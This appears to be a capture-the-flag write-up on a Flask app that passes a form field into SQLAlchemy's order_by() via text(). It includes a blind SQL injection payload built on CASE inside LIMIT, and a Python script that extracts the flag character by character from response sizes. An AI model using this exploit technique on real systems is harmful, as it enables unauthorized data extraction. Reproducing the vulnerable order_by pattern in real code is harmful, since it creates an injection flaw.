# Flaskmetal Alchemist

We are given the following code:

```python
from flask import Flask, render_template, request, url_for, redirect
from models import Metal
from database import db_session, init_db
from seed import seed_db
from sqlalchemy import text

app = Flask(__name__)


@app.teardown_appcontext
def shutdown_session(exception=None):
    db_session.remove()


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        search = ""
        order = None
        if "search" in request.form:
            search = request.form["search"]
        if "order" in request.form:
            order = request.form["order"]
        if order is None:
            metals = Metal.query.filter(Metal.name.like("%{}%".format(search)))
        else:
            metals = Metal.query.filter(
                Metal.name.like("%{}%".format(search))
            ).order_by(text(order))
        return render_template("home.html", metals=metals)
    else:
        metals = Metal.query.all()
        return render_template("home.html", metals=metals)


if __name__ == "__main__":
    seed_db()
    app.run(debug=False)
```

Looking into the `requirements.txt` file, we see that a rather old version of SQLAlchemy is used.

```python
click==8.1.2
Flask==2.1.1
importlib-metadata==4.11.3
itsdangerous==2.1.2
Jinja2==3.1.1
MarkupSafe==2.1.1
SQLAlchemy==1.2.17
Werkzeug==2.1.1
zipp==3.8.0
```

This version is in fact vulnerable to [an SQL injection vulnerability](https://github.com/sqlalchemy/sqlalchemy/issues/4481) in `order_by()`.

However, exploiting this is slightly more challenging as the injection point is after the `ORDER BY` clause - at this point, we won't be able to use things like `UNION`, `WHERE`, `OR`, `AND`, etc.

I came across this [article](https://portswigger.net/support/sql-injection-in-the-query-structure) by PortSwigger where the `CASE` clause is used to determine which column the result is sorted by. We'd have to modify the payload into something that SQLite accepts - diving into the SQLite documentation showed us that the following was valid syntax:

```sql
ORDER BY name LIMIT (CASE (SELECT hex(substr(flag,6,1)) FROM flag limit 1 offset 0) WHEN hex('5') THEN  1 ELSE 2 END)
```

This payload will check the `flag` character at index 6. If it matches the character `5`, then the `LIMIT` is set to 1. Otherwise, the `LIMIT` is set to 2.

We could repeat this for each character of the flag:

```python
import requests

alphabet = '0123456789abcdefghijklmnopqrstuvwxyz_{}'
url = 'http://challenge.nahamcon.com:32142'

curr = 'flag{'
i = 6

done = False
while not done:

    found = False

    for char in alphabet:
        print("Trying {}".format(curr + char))
        r = requests.post(url, data={
            'search': '',
            'order': f"name LIMIT (CASE (SELECT hex(substr(flag,{i},1)) FROM flag limit 1 offset 0) WHEN hex('{char}') THEN  1 ELSE 2 END)"
        })
        # print(r.headers['Content-length'])

        if int(r.headers['Content-length']) < 3646:
            found = True
            curr += char
            i += 1
            print("[+] Found {}".format(curr))

    if not found:
        break
```
